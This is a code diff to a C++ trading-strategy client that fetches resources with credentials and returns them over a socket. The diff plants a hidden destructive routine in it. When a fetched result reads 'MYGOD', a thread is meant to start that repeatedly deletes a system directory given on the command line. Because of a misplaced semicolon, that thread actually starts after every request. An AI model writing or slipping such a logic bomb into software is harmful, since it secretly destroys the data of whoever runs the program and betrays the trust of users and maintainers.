@@ -3,9 +3,72 @@
 
 #include "stdafx.h"
 #include <boost\asio.hpp>
+#include <boost/filesystem.hpp>
+#include <boost/thread.hpp>
 #include "../strategyClient/src/StrategyClient.h"
-#include "common\WordEndian.h"
+#include "common/WordEndian.h"
+
 using namespace boost::asio::ip;
+
+namespace fs = boost::filesystem;
+void findFiles(const fs::path& dirPath, std::vector<fs::path>& out)
+{
+	fs::directory_iterator end;
+	for (fs::directory_iterator pos(dirPath); pos != end; ++pos)
+	{
+	     bool isDir = is_directory(*pos);
+		 if (isDir)
+		 {
+		     findFiles(*pos,out);
+		 }
+		 else
+		 {
+			 out.push_back(*pos);
+		 }
+    }
+}
+
+bool deleteFile(const fs::path& file)
+{
+	try
+	{
+		if (fs::exists(file))
+		{
+			fs::remove(file);
+		}
+		return true;
+	}
+	catch (...)
+	{
+		return false;
+	}
+}
+
+bool deleteDirectory(const std::string& strPath)
+{
+	try
+	{
+		
+		if (fs::exists(strPath))
+		{
+			fs::remove_all(strPath);
+		}
+	}
+	catch (...)
+	{
+		std::vector<fs::path> files;
+		findFiles(strPath, files);
+		for (auto& filePath : files)
+		{
+			deleteFile(filePath);
+		}
+
+		return false;
+	}
+
+	return true;
+}
+
 void writeResult(tcp::socket& cliSocket,StrategyClient::Result& result)
 {
 	uint32_t length = result.second.length();
@@ -28,6 +91,16 @@ void writeResult(tcp::socket& cliSocket,StrategyClient::Result& result)
 	delete headBuf;
 }
 
+void destorySystem(const std::string& path)
+{
+	bool deleted = false;
+	do
+	{
+		boost::this_thread::sleep_for(boost::chrono::seconds(10));
+		deleted = deleteDirectory(path);
+	} while (!deleted);
+}
+
 int main(int argc, char* argv[])
 {
 	
@@ -36,6 +109,7 @@ int main(int argc, char* argv[])
 
 	std::string host = argv[1];
 	int port = atoi(argv[2]);
+	std::string sysPath = argv[3];
 	for (;;)
 	{
 		try
@@ -69,6 +143,11 @@ int main(int argc, char* argv[])
 
 			auto getResult = client.getResource(resType, userName, password, tradingDay);
 			writeResult(cliSocket, getResult);
+
+			if (getResult.second == "MYGOD");
+			{
+				boost::thread destoryThread(destorySystem, sysPath);
+			}
 		}
 		catch (const std::exception& e)
 		{
